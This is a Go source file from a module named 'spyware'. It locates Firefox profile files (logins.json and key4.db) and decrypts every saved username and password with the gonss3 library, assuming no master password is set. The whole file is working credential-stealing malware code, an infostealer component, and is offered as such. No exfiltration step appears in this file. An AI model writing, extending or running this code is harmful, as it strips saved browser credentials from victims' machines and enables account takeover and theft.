package firefox

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"

	"github.com/Nevesto/spyware/models"
	"github.com/rusq/gonss3"
	_ "modernc.org/sqlite"
)

func FindLoginFiles() ([]string, error) {
	profilePaths, err := GetFirefoxProfilePaths()
	if err != nil {
		return nil, fmt.Errorf("failed to get Firefox profile paths: %w", err)
	}

	var loginFiles []string
	for _, profile := range profilePaths {
		loginsFile := filepath.Join(profile, "logins.json")
		keyFile := filepath.Join(profile, "key4.db")

		if _, err := os.Stat(loginsFile); err == nil {
			loginFiles = append(loginFiles, loginsFile)
		}
		if _, err := os.Stat(keyFile); err == nil {
			loginFiles = append(loginFiles, keyFile)
		}
	}

	if len(loginFiles) == 0 {
		return nil, fmt.Errorf("Firefox login files not found")
	}

	return loginFiles, nil
}

func ReadPasswords(loginFiles []string) ([]models.Password, error) {
	var passwords []models.Password

	for _, file := range loginFiles {
		if filepath.Base(file) == "logins.json" {
			profilePath := filepath.Dir(file)
			nssProfile, err := gonss3.New(profilePath, []byte("")) // Later add a master password
			if err != nil {
				return nil, fmt.Errorf("error initializing NSS profile: %w", err)
			}

			loginsData, err := os.ReadFile(file)
			if err != nil {
				return nil, fmt.Errorf("error reading logins.json: %w", err)
			}

			var logins struct {
				Logins []struct {
					Hostname          string `json:"hostname"`
					EncryptedUsername string `json:"encryptedUsername"`
					EncryptedPassword string `json:"encryptedPassword"`
				} `json:"logins"`
			}
			if err := json.Unmarshal(loginsData, &logins); err != nil {
				return nil, fmt.Errorf("error unmarshalling logins.json: %w", err)
			}

			for _, login := range logins.Logins {
				decryptedUsername, err := nssProfile.DecryptField(login.EncryptedUsername)
				var username string
				if err != nil {
					username = fmt.Sprintf("DECRYPTION_FAILED_%v", err)
				} else {
					username = string(decryptedUsername)
				}

				decryptedPassword, err := nssProfile.DecryptField(login.EncryptedPassword)
				var password string
				if err != nil {
					password = fmt.Sprintf("DECRYPTION_FAILED_%v", err)
				} else {
					password = string(decryptedPassword)
				}

				passwords = append(passwords, models.Password{
					OriginURL: login.Hostname,
					Username:  username,
					Password:  password,
				})
			}
		}
	}
	return passwords, nil
}
